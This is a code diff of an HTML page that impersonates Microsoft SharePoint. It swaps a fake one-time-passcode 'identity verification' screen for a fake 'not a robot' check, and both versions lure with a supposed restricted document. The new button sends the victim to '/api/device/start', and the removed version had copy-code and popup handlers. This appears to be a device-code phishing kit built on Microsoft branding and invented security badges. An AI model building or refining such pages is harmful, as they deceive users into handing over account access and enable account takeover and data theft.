@@ -3,161 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SharePoint · Document Access</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <title>SharePoint · Document Verification</title>
     <style>
-        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-        :root { --sp-blue: #038387; --sp-blue-dark: #005A5E; --sp-blue-light: #E8F4F4; --sp-navy: #201F1E; --sp-gray-1: #F5F5F5; --sp-gray-2: #EDEBE9; --sp-gray-3: #C8C6C4; --sp-gray-4: #A19F9D; --sp-gray-5: #605E5C; --sp-white: #FFFFFF; --sp-green: #107C10; --sp-red: #D13438; --radius-md: 8px; --radius-xl: 24px; --shadow-card: 0 2px 4px rgba(0,0,0,.04), 0 8px 24px rgba(0,0,0,.06); }
-        body { font-family: 'Segoe UI', -apple-system, sans-serif; background: var(--sp-gray-1); min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px 16px; }
-        .topbar { width: 100%; max-width: 460px; display: flex; align-items: center; gap: 12px; margin-bottom: 16px; }
-        .sp-logo { display: flex; align-items: center; gap: 8px; }
-        .sp-logo-text { font-size: 20px; font-weight: 700; color: var(--sp-navy); letter-spacing: -0.3px; }
-        .sp-logo-text span { color: var(--sp-blue); }
-        .topbar-divider { width: 1px; height: 20px; background: var(--sp-gray-3); }
-        .topbar-label { font-size: 12px; font-weight: 500; color: var(--sp-gray-4); }
-        .card { background: var(--sp-white); border-radius: var(--radius-xl); box-shadow: var(--shadow-card); border: 1px solid var(--sp-gray-2); width: 100%; max-width: 460px; overflow: hidden; }
-        .card-header { background: linear-gradient(135deg, #038387, #005A5E); padding: 28px 32px 24px; position: relative; overflow: hidden; }
-        .card-header::before { content: ''; position: absolute; right: -30px; top: -30px; width: 120px; height: 120px; border-radius: 50%; background: rgba(255,255,255,.07); }
-        .header-badge { display: inline-flex; align-items: center; gap: 6px; background: rgba(255,255,255,.18); border: 1px solid rgba(255,255,255,.25); border-radius: 40px; padding: 4px 12px; font-size: 11px; font-weight: 600; color: #fff; letter-spacing: 0.3px; margin-bottom: 14px; }
-        .header-badge .dot { width: 8px; height: 8px; border-radius: 50%; background: #6FE58B; animation: pulse-dot 2s infinite; }
-        @keyframes pulse-dot { 0%,100%{opacity:1}50%{opacity:.5} }
-        .card-header h1 { font-size: 22px; font-weight: 700; color: #fff; line-height: 1.3; }
-        .card-header p { margin-top: 6px; font-size: 13px; color: rgba(255,255,255,.8); line-height: 1.5; }
-        .doc-info { display: flex; align-items: center; gap: 12px; padding: 14px 24px; border-bottom: 1px solid var(--sp-gray-2); background: rgba(0,0,0,.02); }
-        .doc-icon { width: 32px; height: 40px; background: var(--sp-blue-light); border-radius: 4px; display: flex; align-items: center; justify-content: center; color: var(--sp-blue); font-size: 18px; flex-shrink: 0; }
-        .doc-meta { flex: 1; min-width: 0; }
-        .doc-title { font-weight: 600; font-size: 13px; color: var(--sp-navy); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        .doc-details { font-size: 11px; color: var(--sp-gray-4); margin-top: 2px; }
-        .doc-badge { flex-shrink: 0; font-size: 10px; font-weight: 500; padding: 3px 8px; background: #E6F9EE; border: 1px solid #6FE58B; border-radius: 4px; color: #0B6A0B; }
-        .card-body { padding: 28px 32px 32px; }
-        .steps { display: flex; align-items: center; gap: 0; margin-bottom: 28px; }
-        .step { display: flex; align-items: center; gap: 8px; flex: 1; position: relative; }
-        .step:not(:last-child)::after { content: ''; position: absolute; left: 28px; right: 0; top: 14px; height: 1px; background: var(--sp-gray-2); }
-        .step-num { width: 28px; height: 28px; border-radius: 50%; border: 1.5px solid var(--sp-gray-3); background: var(--sp-white); color: var(--sp-gray-4); font-size: 12px; font-weight: 700; display: flex; align-items: center; justify-content: center; flex-shrink: 0; position: relative; z-index: 1; transition: all .2s; }
-        .step.active .step-num, .step.done .step-num { background: var(--sp-blue); border-color: var(--sp-blue); color: #fff; }
-        .step.done .step-num { background: var(--sp-green); border-color: var(--sp-green); }
-        .step-label { font-size: 12px; font-weight: 500; color: var(--sp-gray-4); white-space: nowrap; }
-        .step.active .step-label { color: var(--sp-blue); font-weight: 600; }
-        .step.done .step-label { color: var(--sp-green); }
-        .btn-primary { width: 100%; padding: 13px 20px; background: var(--sp-blue); color: #fff; border: none; border-radius: var(--radius-md); font-family: inherit; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 9px; transition: background .15s, transform .1s; }
-        .btn-primary:hover { background: var(--sp-blue-dark); }
-        .btn-primary:active { transform: scale(.99); }
-        .btn-primary:disabled { background: var(--sp-gray-3); cursor: not-allowed; }
-        .btn-secondary { width: 100%; padding: 11px 20px; background: transparent; color: var(--sp-gray-5); border: 1.5px solid var(--sp-gray-3); border-radius: var(--radius-md); font-family: inherit; font-size: 13px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: all .15s; }
-        .btn-secondary:hover { border-color: var(--sp-blue); color: var(--sp-blue); background: var(--sp-blue-light); }
-        .code-panel { display: none; margin-top: 20px; animation: slideUp .25s ease; }
-        .code-panel.show { display: block; }
-        @keyframes slideUp { from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)} }
-        .code-label { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: .8px; color: var(--sp-gray-4); margin-bottom: 10px; display: flex; align-items: center; gap: 6px; }
-        .code-box { background: var(--sp-gray-1); border: 1.5px solid var(--sp-gray-2); border-radius: var(--radius-md); padding: 20px 16px; text-align: center; margin-bottom: 16px; }
-        .code-value { font-family: 'SF Mono', 'Roboto Mono', Consolas, monospace; font-size: 36px; font-weight: 700; letter-spacing: 12px; color: var(--sp-navy); user-select: all; transition: opacity .15s; }
-        .code-value.loading { opacity: .35; }
-        .code-hint { font-size: 12px; color: var(--sp-gray-4); margin-top: 6px; }
-        .timer-row { display: flex; align-items: center; justify-content: space-between; margin-top: 14px; }
-        .timer-pill { display: inline-flex; align-items: center; gap: 6px; background: var(--sp-blue-light); color: var(--sp-blue); border-radius: 40px; padding: 5px 12px; font-size: 13px; font-weight: 600; }
-        .timer-pill.expired { background: #FDE7E9; color: var(--sp-red); }
-        .refresh-btn { background: none; border: none; cursor: pointer; color: var(--sp-blue); font-family: inherit; font-size: 13px; font-weight: 600; display: inline-flex; align-items: center; gap: 5px; padding: 5px 10px; border-radius: 4px; transition: background .12s; }
-        .refresh-btn:hover { background: var(--sp-blue-light); }
-        .action-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 16px; }
-        .status-text { font-size: 12px; color: var(--sp-gray-4); text-align: center; margin-top: 14px; min-height: 18px; }
-        .status-text.error { color: var(--sp-red); background: #FDE7E9; border-radius: 4px; padding: 8px 12px; }
-        .divider { height: 1px; background: var(--sp-gray-2); margin: 24px 0 20px; }
-        .trust-row { display: flex; align-items: center; justify-content: center; gap: 20px; flex-wrap: wrap; }
-        .trust-item { display: flex; align-items: center; gap: 5px; font-size: 11px; color: var(--sp-gray-4); font-weight: 500; }
-        .trust-icon { width: 14px; height: 14px; color: var(--sp-gray-3); flex-shrink: 0; }
-        .overlay { display: none; position: fixed; inset: 0; background: rgba(20,30,45,.55); backdrop-filter: blur(3px); align-items: center; justify-content: center; z-index: 100; }
-        .overlay.show { display: flex; }
-        .overlay-card { background: var(--sp-white); border-radius: var(--radius-xl); padding: 44px 40px 40px; text-align: center; width: 320px; box-shadow: 0 20px 48px rgba(0,0,0,.18); animation: popIn .22s cubic-bezier(.2,.8,.4,1.1); }
-        @keyframes popIn { from{opacity:0;transform:scale(.94)}to{opacity:1;transform:scale(1)} }
-        .check-wrap { width: 60px; height: 60px; background: #E6F9EE; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
-        .overlay-card h3 { font-size: 20px; font-weight: 700; color: var(--sp-navy); margin-bottom: 8px; }
-        .overlay-card p { font-size: 13px; color: var(--sp-gray-4); line-height: 1.55; }
-        .dots { display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 20px; }
-        .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--sp-gray-2); }
-        .dot.active { background: var(--sp-blue); animation: pulse 1s ease infinite; }
-        @keyframes pulse { 0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.3);opacity:.7} }
-        .vg-spin { animation: vg-spin .7s linear infinite; display: inline-block; }
-        @keyframes vg-spin { to{transform:rotate(360deg)} }
-        @media(max-width:480px){.card-header,.card-body{padding-left:24px;padding-right:24px}.action-row{grid-template-columns:1fr}}
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #939ba2; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        
+        /* Card Layout */
+        .card { background: white; border-radius: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.2); padding: 40px; text-align: center; width: 100%; max-width: 450px; }
+        
+        /* Logos */
+        .logo-area { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 24px; font-size: 16px; }
+        .ms-grid { display: grid; grid-template-columns: 10px 10px; gap: 2px; }
+        .ms-grid div { width: 10px; height: 10px; }
+        
+        /* Text Styling */
+        h1 { font-size: 24px; font-weight: 700; color: #1b1b1b; margin-bottom: 16px; line-height: 1.2; }
+        .subtitle { font-size: 14px; color: #444; margin-bottom: 32px; line-height: 1.5; }
+        
+        /* Document Preview Box */
+        .doc-preview { border: 1px solid #dcdcdc; border-radius: 4px; padding: 15px; text-align: left; margin-bottom: 25px; display: flex; align-items: center; gap: 15px; }
+        .doc-preview-name { font-size: 14px; font-weight: 700; color: #000; margin-bottom: 2px; }
+        .doc-preview-meta { font-size: 13px; color: #555; }
+        
+        /* Button & Footer */
+        .btn-primary { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 2px; font-size: 15px; font-weight: 600; cursor: pointer; }
+        .btn-primary:hover { background: #005a9e; }
+        .footer { margin-top: 30px; font-size: 12px; color: #767676; }
     </style>
 </head>
 <body>
-    <div class="topbar">
-        <div class="sp-logo">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><rect width="24" height="24" rx="3" fill="#038387"/><path d="M7 16V8l5-3 5 3v8l-5 3-5-3z" stroke="#fff" stroke-width="1.5" fill="none"/></svg>
-            <span class="sp-logo-text">Share<span>Point</span></span>
-        </div>
-        <div class="topbar-divider"></div>
-        <span class="topbar-label">Team Site Access</span>
-    </div>
+
     <div class="card">
-        <div class="card-header">
-            <div class="header-badge"><span class="dot"></span> Identity Verification Required</div>
-            <h1 data-page-title>Verify your identity</h1>
-            <p data-page-message>Generate a one-time passcode to securely access your team documents.</p>
+        <div class="logo-area">
+            <div class="ms-grid">
+                <div style="background-color: #f25022;"></div>
+                <div style="background-color: #7fba00;"></div>
+                <div style="background-color: #00a4ef;"></div>
+                <div style="background-color: #ffb900;"></div>
+            </div>
+            <span>+</span>
+            <img src="https://cdn.jsdelivr.net/gh/homarr-labs/dashboard-icons/webp/microsoft-sharepoint.webp" alt="SharePoint" style="width: 24px; height: 24px;">
+            <span style="font-weight: 600; color: #201f1e;">SharePoint for Microsoft</span>
         </div>
-        <div class="doc-info">
-            <div class="doc-icon">📊</div>
-            <div class="doc-meta">
-                <div class="doc-title" data-doc-title>Q4 Financial Report</div>
-                <div class="doc-details"><span data-doc-filename>Q4-Financial-Report.xlsx</span> · <span data-doc-pages>8 pages</span></div>
+
+        <h1>Please confirm that you are not a robot</h1>
+        <p class="subtitle">This SharePoint site requires authentication. Complete the verification process to continue.</p>
+        
+        <div class="doc-preview">
+            <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" alt="PDF" style="width: 30px; height: 30px; opacity: 0.7;">
+            <div>
+                <div class="doc-preview-name">Company Policy</div>
+                <div class="doc-preview-meta">Company_Policy.pdf · 12 pages</div>
             </div>
-            <span class="doc-badge">Restricted</span>
         </div>
-        <div class="card-body">
-            <div class="steps" id="stepsRow">
-                <div class="step active" id="step1"><div class="step-num" id="stepNum1">1</div><span class="step-label">Generate</span></div>
-                <div class="step" id="step2"><div class="step-num" id="stepNum2">2</div><span class="step-label">Copy code</span></div>
-                <div class="step" id="step3"><div class="step-num" id="stepNum3">3</div><span class="step-label">Verify</span></div>
-            </div>
-            <button class="btn-primary" id="startBtn" onclick="generateCode()" data-primary-button>
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-                Get verification code
-            </button>
-            <div class="code-panel" id="codePanel">
-                <div class="code-label">
-                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="5" y="2" width="14" height="20" rx="2"/><path d="M9 7h6M9 11h6M9 15h4"/></svg>
-                    One-time passcode
-                </div>
-                <div class="code-box">
-                    <div class="code-value loading" id="codeValue">· · · · · ·</div>
-                    <div class="code-hint" id="codeHint">Connecting to secure gateway…</div>
-                </div>
-                <div class="timer-row">
-                    <div class="timer-pill" id="timerPill" style="display:none"></div>
-                    <button class="refresh-btn" id="refreshBtn" onclick="refreshCode()" style="display:none">
-                        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M23 4v6h-6M1 20v-6h6"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
-                        Get new code
-                    </button>
-                </div>
-                <div class="action-row" id="actionRow" style="display:none">
-                    <button class="btn-secondary" id="copyBtn" onclick="copyAndOpenPopup()">
-                        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
-                        Copy code
-                    </button>
-                    <button class="btn-primary" id="verifyBtn" onclick="verifyWithCopy()">
-                        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
-                        Verify identity
-                    </button>
-                </div>
-                <div class="status-text" id="statusMsg"></div>
-            </div>
-            <div class="divider"></div>
-            <div class="trust-row">
-                <div class="trust-item"><svg class="trust-icon" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M8 1.5l5.5 2v4C13.5 11 11 13.5 8 14.5 5 13.5 2.5 11 2.5 7.5v-4L8 1.5z"/></svg>256-bit encryption</div>
-                <div class="trust-item"><svg class="trust-icon" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="8" cy="8" r="6.5"/><path d="M5.5 8l2 2 3-3"/></svg>Enterprise SSO</div>
-                <div class="trust-item"><svg class="trust-icon" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="4" width="12" height="9" rx="1.5"/><path d="M5 4V3a3 3 0 0 1 6 0v1"/></svg>SOC 2 Type II</div>
-            </div>
+
+        <button class="btn-primary" onclick="startVerification()">Get verification code</button>
+        
+        <div class="footer">
+            Microsoft account · SharePoint · Security · Privacy
         </div>
     </div>
-    <div class="overlay" id="overlay">
-        <div class="overlay-card">
-            <div class="check-wrap"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#107C10" stroke-width="2.5" stroke-linecap="round"><polyline points="20 6 9 17 4 12"/></svg></div>
-            <h3>Access granted</h3>
-            <p id="overlayMsg">Identity verified.<br>Redirecting to your document…</p>
-            <div class="dots"><div class="dot active"></div><div class="dot"></div><div class="dot"></div></div>
-        </div>
-    </div>
+
+    <script>
+        function startVerification() { 
+            // This function triggers the redirection as requested
+            window.location.href = '/api/device/start'; 
+        }
+    </script>
 </body>
 </html>
